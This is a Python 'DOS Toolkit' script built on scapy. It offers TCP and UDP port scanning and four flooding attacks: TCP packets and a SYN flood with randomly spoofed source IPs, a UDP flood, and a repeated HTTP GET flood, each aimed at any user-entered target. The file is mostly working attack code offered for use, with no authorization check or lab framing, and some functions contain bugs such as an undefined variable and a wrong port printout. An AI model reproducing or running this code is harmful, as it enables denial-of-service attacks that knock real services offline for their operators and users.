#! /usr/bin/env python

# Developer: Victor Pegoraro

#Call libs
import scapy.all as scapy
import random, socket, colorama, time, sys

#Init the colorama module
colorama.init()
GREEN  = colorama.Fore.GREEN
GRAY   = colorama.Fore.LIGHTBLACK_EX
RESET  = colorama.Fore.RESET
CYAN   = colorama.Fore.CYAN
RED    = colorama.Fore.RED
YELLOW = colorama.Fore.YELLOW

#Get IP address 
def get_Host_name_IP(host):
    try: 
        host_ip = socket.gethostbyname(host) #Get IP from url
        print("[+] Hostname: ", host) 
        print("[+] IP: ",host_ip) 
        return host_ip
    except: 
        print(f"{RED}[-] Unable to get Hostname and IP{RESET}")


#DOS TCP function
def dos_tcp(host):
    packets = int(input("[#] Send packets:"))
    source_port = 8080
    i = 0
    while i <= packets:
        i1 = str(random.randint(1,254))
        i2 = str(random.randint(1,254))
        i3 = str(random.randint(1,254))
        i4 = str(random.randint(1,254))
        d  = "."
        source_ip = i1+d+i2+d+i3+d+i4         #Random source IP
        target_port = random.randint(10,1000) #Random target port
        IP1 = scapy.IP(src = source_ip, dst = host)
        TCP = scapy.TCP(sport = source_port, dport = target_port) #Create TCP packets
        pkt = IP1 / TCP

        scapy.send(pkt, inter = .001) #Send packet
        print(f"{YELLOW}[!] Packet send ", i, f"{RESET}") #Print number of packets

        i = i + 1

    print(f"\n{GREEN}[+] ATTACK DONE...{RESET}")

#UDP flood function
def dos_udp(host):
    udp_port = int(input("[#] UDP port: ")) 
    packets  = int(input("[#] Send packets: "))
    i = 0
    while i <= packets:
        i1 = str(random.randint(1,254))
        i2 = str(random.randint(1,254))
        i3 = str(random.randint(1,254))
        i4 = str(random.randint(1,254))
        d  = "."
        source_ip = i1+d+i2+d+i3+d+i4      #Random source ip
        payload_udp = "udp" * 100          #Create payload
        ip = scapy.IP(src=source_ip, dst=host)
        udp = scapy.UDP(sport=2600, dport=udp_port)
        pkt = ip/udp/payload_udp
        pkt.getlayer(1).len = len(pkt.getlayer(1)) #Force UDP len
        scapy.send((pkt/"\x01\x01\x01\x00"))
        print(f"{YELLOW}[!] Send packet " + str(i) + f"{RESET}", end="\r")
        i += 1

    print(f"\n{GREEN}[+] ATTACK DONE...{RESET}")

#SYN flood
def dos_syn(host):
    syn_port = int(input("[#] SYN port: "))
    packets  = int(input("[#] Send packets: "))
    i = 0
    while i <= packets:
        s_port  = random.randint(2,5000)
        s_eq    = random.randint(2,5000)
        w_indow = random.randint(2,5000)

        #Create random source ip
        i1 = str(random.randint(1,254))
        i2 = str(random.randint(1,254))
        i3 = str(random.randint(1,254))
        i4 = str(random.randint(1,254))
        d  = "."
        source_ip = i1+d+i2+d+i3+d+i4  #Set random source IP

        IP_Packet = scapy.IP(src=source_ip, dst=host)

        TCP_Packet = scapy.TCP(sport= s_port, dport= syn_port, flags= "S", seq= s_eq, window= w_indow)

        scapy.send(IP_Packet/TCP_Packet, verbose=0)  #Send packets
        print(f"{YELLOW}[!] Send SYN packet " + str(i) + f"{RESET}", end="\r")
        i += 1

    print(f"\n{GREEN}[+] ATTACK DONE...{RESET}")

#Send HTTP requests
def http_flood(url):
    packets = int(input("[#] Send packets: "))
    #Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 80
    i = 0
    server_address = (url, port)
    try:
        dos.connect(server_address)
        while i <= packets:
            #Some data 
            request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % url
            try:
                #Send packet
                dos.send(request.encode()) 
                print(f"{YELLOW}[!] Send HTTP packet " + str(i) + f"{RESET}", end="\r")
                i += 1
            except:
                print(f"{RED}[-] Server " + host + f"disconnect...{RESET}", end="\r")
        #Finish attack
        if i > packets:
            print(f"\n{GREEN}[+] ATTACK DONE...{RESET}")
    except:
        print(f"{RED}[-] Server " + host + f" disconnect...{RESET}", end="\r")


#Check port open TCP
def is_port_open(host, port,ports_open):
    s = socket.socket()
    try:
        #Tries to connect to host using that port
        s.connect((host, port))

    except:
        #Cannot connect, port is closed
        return False
    else:
        #The connection was established, port is open!
        ports_open.append(port)
        return True

#TCP port scan
def tcp_scan(host):
    
    socket.setdefaulttimeout(0.2) #Set time for socket
    start_port = int(input("[#] Start port: "))
    end_port = int(input("[#] End port: "))
    print (f'{CYAN}[+] Starting scan on host: ', host, f"{RESET}")
    startTime = time.time() #Get start time
    ports_open = [] #Set list

    #Check ports
    for port in range(start_port, end_port):
        if is_port_open(host, port,ports_open):
            print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
        else:
            print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")

    print('\n[#]Time taken:', time.time() - startTime) #Calculate process time 

    #Show ports open
    print(f"{YELLOW}[!] Ports open:{RESET}")
    for port in ports_open:
        print(f"{GREEN}[+] Port open: " + str(port) + f"{RESET}")

#UDP port scan
def udp_scan(host):
    open_udp_port = [] #Set list
    start_port = int(input("[#] Start port: "))
    end_port = int(input("[#] End port: "))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #create socket
    data = "Test_scan"  #Create payload

    #Check connections
    for port in range(start_port,end_port):
        try:
            #Try send data
            s.sendto(data,(host,port))
            print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
            open_udp_port.append(port) #If connected, add port in list
        except:
            print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")

    print(f"\n{GREEN}[+] UDP scan done !{RESET}")

    #Show ports open
    for p in open_udp_port:
        print(f"{GREEN}[+] Port open: " + str(port) + f"{RESET}")


#Start prints
start = """
            ##########################
            ## V 1.0                ##
            ##                      ##
            ##      DOS Toolkit     ##
            ##                      ##
            ## Dev: Victor Pegoraro ##
            ##########################
        """

menu = """
        --------------MENU----------------

        1 - TCP scan      5 - SYN flood
        2 - UDP scan      6 - HTTP flood
        3 - Dos tcp       7 - exit
        4 - Dos udp       
        ----------------------------------
       """

#########################################
#Start program
print(f"{RED}" + start + f"{RESET}")

#Rotine
while True:
    print(f"{RESET}"+menu)
    option = input(f"{CYAN}[#] Option:{RESET}") #User option

    if option.isnumeric(): #Validate option

        #Options
        if option == '7':
            print(f"{GREEN}[+] Exting..{RESET}")
            break

        elif option == '1':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            tcp_scan(host)

        elif option == '2':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            udp_scan(host)

        elif option == '3':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            dos_tcp(host)

        elif option == '4':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            dos_udp(host)
            

        elif option == '5':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            dos_syn(host)

        elif option == '6':
            url = input(f"\n{GREEN}[$] Target url:{RESET}")
            host = get_Host_name_IP(url)
            http_flood(url)

        else:
            print(f"{RED}\n[-] Option incorrect!{RESET}")

    else:
        print(f"{RED}\n[-] Option incorrect!{RESET}")

sys.exit()
